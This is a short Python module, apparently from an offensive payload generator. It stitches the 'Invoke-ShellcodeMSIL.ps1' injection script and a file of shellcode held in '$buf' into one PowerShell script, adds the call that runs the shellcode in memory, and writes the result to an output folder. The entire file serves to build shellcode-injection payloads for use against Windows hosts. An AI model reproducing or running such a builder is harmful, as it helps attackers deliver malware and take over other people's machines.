import os
class operation:
    def __init__(self):
        self.outputfilename = input('please type outputfile_basename:')
        self.path = os.getcwd()

    def read_payload(self,filename):
        payload = open(filename,'r')
        self.payload = payload.read()
        payload.close()
        return self.payload

    def create_payload(self):
        with open (''.join([os.getcwd(),'/output/',self.outputfilename,'.ps1']),'w') as create_payload:
            create_payload.write('\n\n'.join([self.read_payload(filename=self.path+'/module/injectshellcode/'+'Invoke-ShellcodeMSIL.ps1'),
                                              self.read_payload(filename=self.path+'/temp/'+'temp.ps1'),
                                              'Invoke-ShellcodeMSIL -Shellcode @($buf)',
                                              ]))
        print('Your output file is in %s/output/%s.ps1' %(self.path,self.outputfilename))

